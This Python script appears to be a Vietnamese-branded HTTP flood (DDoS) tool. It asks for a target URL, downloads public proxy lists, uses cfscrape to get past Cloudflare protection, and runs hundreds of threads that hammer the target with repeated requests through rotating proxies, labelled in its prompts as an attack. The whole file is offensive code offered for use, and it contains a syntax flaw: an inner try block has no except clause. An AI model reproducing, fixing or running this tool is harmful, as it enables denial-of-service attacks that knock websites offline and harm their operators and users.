import cfscrape
import os
import random
import time
import requests
import threading
from colorama import Fore
print(Fore.YELLOW + """  
██╗  ██╗██████╗ ██████╗ 
╚██╗██╔╝██╔══██╗██╔══██╗
 ╚███╔╝ ██║  ██║██████╔╝
 ██╔██╗ ██║  ██║██╔══██╗
██╔╝ ██╗██████╔╝██████╔╝
╚═╝  ╚═╝╚═════╝ ╚═════╝ 
""")
print("Hồ Xuân Bình - Dev")
 
def opth():
    for a in range(thr):
        x = threading.Thread(target=atk)
        x.start()
        print("Threads " + str(a+1) + " Created ")
    print(Fore.RED + "Chờ một vài giây để các chuỗi sẵn sàng tấn công ...")
    time.sleep(10)
    input(Fore.CYAN + "Nhấn Enter để khởi chạy cuộc tấn công!")
    global oo
    oo = True
 
oo = False
def main():
    global url
    global list
    global pprr
    global thr
    global per
    url = str(input(Fore.GREEN + "Url : " + Fore.WHITE))
    ssl = str(input(Fore.GREEN + "Bật Chế độ SSL? (y/n) : " + Fore.WHITE))
    ge = str(input(Fore.GREEN + "Nhận danh sách proxy mới? (y/n) : " + Fore.WHITE))
    if ge =='y':
        if ssl == 'y':
            rsp = requests.get('https://api.proxyscrape.com/?request=displayproxies&proxytype=http&country=all&anonymity=all&ssl=yes&timeout=2000') #Code By 3rr0r Hun73r
            with open('proxies.txt','wb') as fp:
                fp.write(rsp.content)
                print(Fore.CYAN + "Sucess Get Https Proxies List !")
        else:
            rsp = requests.get('https://api.proxyscrape.com/?request=displayproxies&proxytype=http&country=all&anonymity=all&ssl=all&timeout=1000') #Code By 3rr0r Hun73r
            with open('proxies.txt','wb') as fp:
                fp.write(rsp.content)
                print(Fore.CYAN + "Sucess Get Http Proxies List !")
    else:
        pass
    list = str(input(Fore.GREEN + "List (proxies.txt) : " + Fore.WHITE))
    pprr = open(list).readlines()
    print(Fore.GREEN + "Proxies Count : " + Fore.WHITE + "%d" %len(pprr))
    thr = int(input(Fore.GREEN + "Threads (1-400 Default Is 300) : " + Fore.WHITE))
    per = int(input(Fore.GREEN + "CC.Power (1-100 Default Is 70) : " + Fore.WHITE))
    opth()
 
def atk():
    pprr = open(list).readlines()
    proxy = random.choice(pprr).strip().split(":")
    s = cfscrape.create_scraper()
    s.proxies = {}
    s.proxies['http'] = 'http://'+str(proxy[0])+":"+str(proxy[1])
    s.proxies['https'] = 'https://'+str(proxy[0])+":"+str(proxy[1])
    time.sleep(5)
    while True:
        while oo:
            try:
                s.get(url)
                print(Fore.CYAN + "HXB-DEV -> " + Fore.WHITE + str(url)+ Fore.CYAN + " XDB~# " +Fore.WHITE+ str(proxy[0])+":"+str(proxy[1]))
                try:
                    for g in range(per):
                        s.get(url)
                        print(Fore.CYAN + "HXB-DEV -> " + Fore.WHITE + str(url)+Fore.CYAN + " XDB~# " +Fore.WHITE + str(proxy[0])+":"+str(proxy[1])) #Hồ Xuân Bình - Dev
                    s.close()
            except:
                s.close()
                print(Fore.RED + "Can't Connect To Proxies Or Url !")
 
 
if __name__ == "__main__":
    main()